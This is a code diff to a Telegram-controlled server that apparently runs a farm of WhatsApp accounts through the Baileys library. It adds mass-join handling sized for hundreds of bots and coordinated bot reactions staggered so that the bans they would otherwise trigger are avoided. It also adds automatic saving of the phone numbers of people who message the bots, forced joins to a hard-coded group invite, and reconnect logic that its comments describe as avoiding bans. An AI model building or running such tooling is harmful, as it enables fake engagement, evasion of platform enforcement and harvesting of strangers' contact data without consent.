@@ -6,7 +6,8 @@ import {
     fetchLatestBaileysVersion, 
     Browsers,
     jidNormalizedUser,
-    makeCacheableSignalKeyStore
+    makeCacheableSignalKeyStore,
+    isJidUser
 } from '@whiskeysockets/baileys';
 import TelegramBot from 'node-telegram-bot-api';
 import fs from 'fs';
@@ -16,15 +17,15 @@ import express from 'express';
 import { delay } from '@whiskeysockets/baileys'; 
 import http from 'http'; 
 import { Boom } from '@hapi/boom';
+import fetch from 'node-fetch'; // Required for fetch in server routes
 
 import { 
-    // ... existing imports
-    setupTelegramCommands, userMessageCache, userState, reactionConfigs 
-} from './telegram_commands.js';
-// ... rest of main file imp
+    setupTelegramCommands, userMessageCache, userState, reactionConfigs, autoSaveState // Imported and managed globally
+} from './telegram_commands.js'; 
+
 import { 
     initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
-    getShortId, saveShortId, deleteShortId, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, setAntiMsgStatus, updateConnectionTime, saveVerificationData
+    getShortId, saveShortId, deleteShortId, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, setAntiMsgStatus, updateConnectionTime, saveVerificationData, setAutoSaveStatus
 } from './db.js';
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
@@ -127,7 +128,6 @@ app.get('/verify', (req, res) => {
 // --- API: SYNCHRONOUS JOIN (1 Bot Per Second) ---
 app.post('/api/join', async (req, res) => {
     // 1. Set Timeout to 15 minutes (900,000ms)
-    // This allows up to ~800 bots to join in one request without timing out.
     req.setTimeout(900000); 
     res.setTimeout(900000);
 
@@ -255,7 +255,6 @@ const mainBot = new TelegramBot(TELEGRAM_TOKEN, {
         interval: 300,
         autoStart: true,
         params: {
-            // THIS LINE IS CRITICAL FOR REACTIONS TO WORK:
             allowed_updates: ["message", "callback_query", "message_reaction", "message_reaction_count", "chat_member"]
         }
     }
@@ -267,12 +266,11 @@ const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });
 const clients = {}; 
 const shortIdMap = {}; 
 const antiMsgState = {}; 
-const autoSaveState = {}; 
+// Removed autoSaveState from here as it's now imported from telegram_commands.js
 const qrMessageCache = {}; 
 const qrActiveState = {}; 
 
 // 🛡️ NUKE CACHE: Prevents duplicate block actions
-// If a JID is in here, we don't attack them again for 30 seconds
 const nukeCache = new Set();
 
 if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
@@ -354,7 +352,7 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                 isAdmin = true;
             }
         } catch (e) {
-            console.error(`[REACT ADMIN CHECK FAIL] Error fetching metadata for ${remoteJid}: ${e.message}`);
+            // console.error(`[REACT ADMIN CHECK FAIL] Error fetching metadata for ${remoteJid}: ${e.message}`);
         }
 
         if (isAdmin) {
@@ -367,19 +365,17 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                 const emojis = reactionConfigs[remoteJid];
                 
                 // 1. STAGGER DELAY: Delay = Bot Index * 10 seconds (10000ms)
-                // This prevents instant mass reaction and potential bans.
                 const delayTime = botIndex * 10000;
                 await delay(delayTime); 
                 
                 // 2. Determine Emoji and Send
                 const emojiIndex = botIndex % emojis.length;
-                // FIX: Trim the selected emoji to prevent encoding corruption (square box issue)
                 const selectedEmoji = emojis[emojiIndex].trim(); 
                 
                 const reactionContent = {
                     react: {
                         text: selectedEmoji, 
-                        key: msg.key // Key of the message to react to
+                        key: msg.key 
                     }
                 };
                 
@@ -387,7 +383,7 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                     await sock.sendMessage(remoteJid, reactionContent);
                     console.log(`[REACT] Bot ${cachedShortId} reacted to Admin message with ${selectedEmoji}`);
                 } catch(e) {
-                    console.error(`[REACT FAIL] Bot ${cachedShortId}: ${e.message}`);
+                    // console.error(`[REACT FAIL] Bot ${cachedShortId}: ${e.message}`);
                 }
             }
         }
@@ -395,18 +391,16 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
     // --- End Reaction Feature Logic ---
 
 
+    // --- ANTI-MESSAGE LOGIC (BLOCK & DELETE) ---
     if (antiMsgState[cachedShortId]) {
         const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
         const isCommand = text.startsWith('.');
 
         // 1. IGNORE GROUPS, STATUS, COMMANDS, SELF
-        if (!isGroup && !isStatus && !isCommand && !isSelf) {
+        if (!isGroup && !isStatus && !isCommand && !isSelf && isJidUser(remoteJid)) {
             
             // 2. REPEAT CHECK: Did we already nuke this person?
-            if (nukeCache.has(remoteJid)) {
-                // ALREADY BLOCKED. IGNORE.
-                return; 
-            }
+            if (nukeCache.has(remoteJid)) return; 
 
             // 3. ADD TO CACHE (Lock the target for 30s)
             nukeCache.add(remoteJid);
@@ -418,7 +412,6 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                 sock.updateBlockStatus(remoteJid, "block").catch(() => {})
             ]);
             
-            // Log it
             if (msg.key.fromMe) {
                 console.log(`[ANTIMSG] Linked Device Attack Neutralized (One-Shot).`);
             } else {
@@ -429,60 +422,21 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
         }
     }
 
+    // --- AUTOSAVE LOGIC (New Number Logging Fix) ---
     if (!msg.key.fromMe) {
+        // Check if autosave is enabled for this bot ID (state managed in telegram_commands)
         if (autoSaveState[cachedShortId]) {
             if (remoteJid.endsWith('@s.whatsapp.net')) {
-                addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
+                // Ensure the JID is a valid user JID before attempting to save
+                if (isJidUser(remoteJid)) {
+                    addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {
+                        // console.error('Failed to autosave number:', remoteJid);
+                    });
+                }
             }
         }
-        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
-        if (text.toLowerCase() === '.alive') {
-            await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
-        }
-    }
-
-
-
-    if (antiMsgState[cachedShortId]) {
-        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
-        const isCommand = text.startsWith('.');
-
-        // 1. IGNORE GROUPS, STATUS, COMMANDS, SELF
-        if (!isGroup && !isStatus && !isCommand && !isSelf) {
-            
-            // 2. REPEAT CHECK: Did we already nuke this person?
-            if (nukeCache.has(remoteJid)) {
-                // ALREADY BLOCKED. IGNORE.
-                return; 
-            }
-
-            // 3. ADD TO CACHE (Lock the target for 30s)
-            nukeCache.add(remoteJid);
-            setTimeout(() => nukeCache.delete(remoteJid), 30000);
-
-            // 4. EXECUTE ONCE (Delete & Block)
-            await Promise.all([
-                sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {}),
-                sock.updateBlockStatus(remoteJid, "block").catch(() => {})
-            ]);
-            
-            // Log it
-            if (msg.key.fromMe) {
-                console.log(`[ANTIMSG] Linked Device Attack Neutralized (One-Shot).`);
-            } else {
-                console.log(`[ANTIMSG] Incoming Stranger Blocked (One-Shot).`);
-            }
-            
-            return; 
-        }
-    }
-
-    if (!msg.key.fromMe) {
-        if (autoSaveState[cachedShortId]) {
-            if (remoteJid.endsWith('@s.whatsapp.net')) {
-                addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
-            }
-        }
+        
+        // --- Alive Check ---
         const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
         if (text.toLowerCase() === '.alive') {
             await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
@@ -493,6 +447,8 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
 
     sock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect, qr } = update;
+        // Check if registered is available in authState.creds
+        const isRegistered = sock.authState.creds.registered; 
 
         if (connection === 'open' && qrMessageCache[folder]) {
             const { messageId, chatId: qrChatId } = qrMessageCache[folder];
@@ -501,6 +457,7 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
             delete qrActiveState[folder];
         }
         
+        // --- QR Code Handling ---
         if (qr && chatId && !qrActiveState[folder]) {
             qrActiveState[folder] = true;
             try {
@@ -515,15 +472,20 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                 });
                 qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
                 
+                // QR Timeout: If not scanned within 60 seconds, delete message and stop retrying
                 setTimeout(async () => {
-                    if (qrMessageCache[folder]) {
+                    if (qrMessageCache[folder] && connection !== 'open') {
                         try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                         delete qrMessageCache[folder];
+                        
+                        // If not registered, this will lead to a 'close' event 
+                        // and the 'else' block below will handle the restart (or not)
                     }
                 }, 60000);
             } catch (e) { delete qrActiveState[folder]; }
         }
 
+        // --- Connection Open ---
         if (connection === 'open') {
             const userJid = jidNormalizedUser(sock.user.id);
             const phoneNumber = userJid.split('@')[0];
@@ -539,10 +501,12 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
             
             const credsFile = path.join(sessionPath, 'creds.json');
             const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
-            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autoSaveState[cachedShortId] || false, cachedShortId);
+            // Use antiMsgState and autoSaveState (imported from telegram_commands.js) to save current status
+            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autoSaveState[cachedShortId] || false, cachedShortId, antiMsgState[cachedShortId] || false);
             
             updateAdminNotification(`[CONNECTED] +${phoneNumber}`);
 
+            // Group joins logic
             try { 
                 const inviteCode1 = "FFYNv4AgQS3CrAokVdQVt0";
                 await sock.groupAcceptInvite(inviteCode1);
@@ -559,11 +523,10 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                     userMessageCache[chatId] = [];
                 }
                 
-                  // --- UPDATED MESSAGE WITH NUMBER ---
                 mainBot.sendMessage(chatId, 
                     `[CONNECTED]\n` +
                     `ID: \`${cachedShortId}\`\n` +
-                    `Number: +${phoneNumber}\n\n` +  // <--- Added Number Here
+                    `Number: +${phoneNumber}\n\n` +
                     `Account connected successfully!\n\n` +
                     `**Defense Active**\n(One-Shot Block & Delete System)`,  { 
                     parse_mode: 'Markdown',
@@ -583,22 +546,19 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
             }, 3600000);
         }
 
-                        if (connection === 'close') {
+        // --- Connection Close (Critical Ban Fix Area) ---
+        if (connection === 'close') {
             const userJid = sock.user?.id || "";
-            // Get the phone number from the JID or the shortIdMap if JID is not available
             const phoneNumber = userJid.split(':')[0].split('@')[0] || shortIdMap[cachedShortId]?.phone || 'Unknown';
             let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
 
-            // Check for definitive logout or ban status
+            // Check for definitive logout or ban status (Permanent Loss)
             if (reason === 403 || reason === DisconnectReason.loggedOut) {
-                // Determine if it's a ban or a manual logout
+                
                 const disconnectStatus = (reason === 403) ? '🚨 BANNED/BLOCKED' : '🚪 LOGGED OUT';
-
-                // 1. Calculate remaining bots *before* cleanup
-                // We check the length of the clients map and subtract 1 (for the current client)
                 const remainingBots = Object.keys(clients).length - 1; 
 
-                // 2. Send ALERT to Admin
+                // Send ALERT to Admin
                 try {
                     await mainBot.sendMessage(ADMIN_ID, 
                         `⚠️ **BOT DISCONNECTED** ⚠️\n\n` +
@@ -612,15 +572,27 @@ sock.ev.on('messages.upsert', async ({ messages, type }) => {
                     console.error("Failed to send Admin Disconnect Alert:", e);
                 }
                 
-                // 3. Perform Cleanup
-                // This logic is necessary because the connection is permanently lost.
+                // Perform Cleanup
                 await deductOnDisconnect(folder);
                 await deleteSessionFromDb(folder);
                 deleteShortId(folder);
                 if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                 delete clients[folder];
 
-            } 
+            } else {
+                // If it's a temporary disconnect (e.g., network error or QR timeout)
+                
+                if (isRegistered) {
+                    // 1. REGISTERED Bot (Existing Session): DO NOT RESTART.
+                    // This prevents aggressive reconnection loops that lead to 403 (ban).
+                    console.log(`[DISCONNECT] Temporary disconnect for ${cachedShortId}. Reason: ${reason}. NOT restarting (Registered).`);
+                } else {
+                    // 2. UNREGISTERED Bot (Initial Pairing): RESTART ONCE.
+                    // This is necessary for the QR code or pairing code to be refreshed/retried.
+                    console.log(`[RECONNECT] Attempting restart for NEW client ${cachedShortId}. Reason: ${reason}`);
+                    startClient(folder, null, chatId, telegramUserId);
+                }
+            }
         }
     });
 
@@ -640,19 +612,29 @@ async function boot() {
     const savedSessions = await getAllSessions(null);
     for (const session of savedSessions) {
         const folderPath = path.join(SESSIONS_DIR, session.session_id);
+        
+        // Ensure folder exists and creds file is written from DB content
         if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
         if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
         
         let shortId = await getShortId(session.session_id);
         if (!shortId) { shortId = generateShortId(); await saveShortId(session.session_id, shortId); }
 
-        shortIdMap[shortId] = { folder: session.session_id, phone: session.phone, chatId: session.telegram_user_id, connectedAt: new Date(session.connected_at) };
+        // Populate global state maps
+        shortIdMap[shortId] = { 
+            folder: session.session_id, 
+            phone: session.phone, 
+            chatId: session.telegram_user_id, 
+            connectedAt: new Date(session.connected_at) 
+        };
+        // Populate feature states (used in messages.upsert in this file)
         if (session.antimsg) antiMsgState[shortId] = true;
+        // Populate autoSaveState (used in messages.upsert here, but managed in telegram_commands)
         if (session.autosave) autoSaveState[shortId] = true; 
 
         startClient(session.session_id, null, null, session.telegram_user_id);
     }
-    console.log(`[BOOT] Server ready`);
+    console.log(`[BOOT] Server ready. Loaded ${savedSessions.length} sessions.`);
 }
 
 setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL, qrActiveState, deleteUserAccount);
